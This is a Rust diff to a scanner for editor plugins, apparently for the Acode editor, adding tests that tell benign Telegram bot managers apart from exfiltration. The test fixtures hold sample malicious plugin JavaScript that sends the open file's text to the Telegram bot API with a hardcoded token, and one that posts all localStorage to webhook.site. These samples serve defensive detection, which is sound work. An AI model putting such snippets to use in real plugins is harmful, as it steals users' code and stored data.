@@ -248,13 +248,16 @@ fn correlate(report: &mut Report, sensitive_files: &[String]) {
         .findings
         .iter()
         .filter(|finding| {
-            finding.id == "network.suspicious_endpoint" && finding.severity >= Severity::High
+            matches!(
+                finding.id.as_str(),
+                "network.suspicious_endpoint" | "network.hardcoded_bot_token"
+            ) && finding.severity >= Severity::High
         })
-        .map(|finding| {
+        .filter_map(|finding| {
             finding
                 .key
-                .trim_start_matches("network.suspicious_endpoint:")
-                .to_string()
+                .split_once(':')
+                .map(|(_, host)| host.to_string())
         })
         .collect::<std::collections::BTreeSet<_>>()
         .into_iter()
@@ -651,6 +654,107 @@ mod tests {
         assert!(report.has("archive.metadata_path_content"));
         assert!(report.has("shell.dangerous_command"));
         assert_eq!(report.verdict.recommendation, Recommendation::Block);
+    }
+
+    #[test]
+    fn bot_manager_with_runtime_token_is_not_exfiltration() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                br#"acode.setPluginInit('com.example.p', () => {
+                  const bots = JSON.parse(localStorage.getItem('bots') || '[]');
+                  const api = (token, method, body) => fetch('https://api.telegram.org/bot' + token + '/' + method, { method: 'POST', body: JSON.stringify(body) });
+                  for (const b of bots) api(b.token, 'getUpdates', { offset: b.offset });
+                  localStorage.setItem('bots', JSON.stringify(bots));
+                });"#,
+            ),
+        ]);
+        assert!(
+            !report.has("correlation.exfiltration"),
+            "{:#?}",
+            report.findings
+        );
+        assert_eq!(
+            report.verdict.recommendation,
+            Recommendation::Pass,
+            "{:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn hardcoded_bot_token_with_editor_read_is_blocked() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                br#"acode.setPluginInit('com.example.p', () => {
+                  const k = '7012345678:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw';
+                  const text = editorManager.activeFile.session.getValue();
+                  fetch('https://api.telegram.org/bot' + k + '/sendMessage', { method: 'POST', body: JSON.stringify({ chat_id: 1, text }) });
+                });"#,
+            ),
+        ]);
+        assert!(
+            report.has("network.hardcoded_bot_token"),
+            "{:#?}",
+            report.findings
+        );
+        assert!(
+            report.has("correlation.exfiltration"),
+            "{:#?}",
+            report.findings
+        );
+        assert_eq!(report.verdict.recommendation, Recommendation::Block);
+    }
+
+    #[test]
+    fn web_storage_dump_to_webhook_is_blocked() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                br#"acode.setPluginInit('com.example.p', () => {
+                  fetch('https://webhook.site/x', { method: 'POST', body: JSON.stringify(localStorage) });
+                });"#,
+            ),
+        ]);
+        assert!(
+            report.has("storage.web_storage_dump"),
+            "{:#?}",
+            report.findings
+        );
+        assert!(report.has("correlation.exfiltration"));
+        assert_eq!(report.verdict.recommendation, Recommendation::Block);
+    }
+
+    #[test]
+    fn own_storage_keys_with_webhook_is_review_not_block() {
+        let report = scan(&[
+            MANIFEST,
+            ICON,
+            README,
+            (
+                "main.js",
+                br#"acode.setPluginInit('com.example.p', () => {
+                  localStorage.setItem('seen', '1');
+                  fetch('https://webhook.site/x', { method: 'POST', body: 'ping' });
+                });"#,
+            ),
+        ]);
+        assert!(
+            !report.has("correlation.exfiltration"),
+            "{:#?}",
+            report.findings
+        );
+        assert_eq!(report.verdict.recommendation, Recommendation::Review);
     }
 
     #[test]
